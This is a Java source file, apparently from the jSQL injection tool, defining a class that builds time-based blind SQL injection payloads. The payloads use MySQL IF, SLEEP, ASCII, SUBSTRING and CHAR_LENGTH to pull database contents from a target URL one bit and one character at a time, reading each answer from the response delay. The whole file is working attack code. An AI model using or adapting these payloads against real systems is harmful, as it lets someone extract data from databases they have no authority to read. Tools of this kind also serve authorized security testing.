package com.jsql.model.blind;

import java.util.Calendar;
import java.util.Date;
import java.util.List;

import com.jsql.model.blind.diff_match_patch.Diff;

/**
 * Define a call HTTP to the server, require the associated url, character position and bit.
 * diffSeconds represents the response time of the current page
 */
public class TimeCallable implements IBlindCallable {
    /**
     * The URL called.
     */
    private String timeUrl;

    /**
     * Time before the url call.
     */
    private Calendar calendar1 = Calendar.getInstance();
    
    /**
     * Time at the end of the url call.
     */
    private Calendar calendar2 = Calendar.getInstance();
    
    /**
     * Current page loading time.
     */
    private long diffSeconds;

    /**
     * Character position.
     */
    private int currentIndex;
    
    /**
     * Bit searched.
     */
    private int currentBit;

    /**
     * Default call used for bit test.
     */
    private boolean isLengthTest = false;

    /**
     * Constructor for preparation and blind confirmation.
     * @param inj
     */
    TimeCallable(String inj) {
        this.timeUrl = "+and+if(" + inj + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
    }
    
    /**
     * Constructor for bit test.
     * @param inj
     * @param indexCharacter
     * @param bit
     */
    TimeCallable(String inj, int indexCharacter, int bit) {
        this.timeUrl = "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
        this.currentIndex = indexCharacter;
        this.currentBit = bit;
    }

    public TimeCallable(String inj, int indexCharacter, boolean isLengthTest) {
        this.timeUrl = "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
        this.currentIndex = indexCharacter;
        this.isLengthTest = isLengthTest;
    }
    
    /**
     * Check if a response time means the SQL query is true.
     * @return true if the current SQL test is confirmed
     */
    public boolean isTrue() {
        return this.diffSeconds < ConcreteTimeInjection.SLEEP;
    }

    /**
     * Process the URL HTTP call, use function inject() from the model.
     * Calculate the response time of the current page.
     * @return Functional Time callable
     */
    @Override
    public TimeCallable call() throws Exception {
        this.calendar1.setTime(new Date());
        ConcreteTimeInjection.callUrl(timeUrl);
        this.calendar2.setTime(new Date());
        long milliseconds1 = calendar1.getTimeInMillis();
        long milliseconds2 = calendar2.getTimeInMillis();
        long diff = milliseconds2 - milliseconds1;
        this.diffSeconds = diff / 1000;
        return this;
    }
    
    public boolean isLengthTest() {
        return this.isLengthTest;
    }
    
    public int getCurrentIndex() {
        return this.currentIndex;
    }
    
    public int getCurrentBit() {
        return this.currentBit;
    }

    @Override
    public List<Diff> getOpcodes() {
        return null;
    }
}
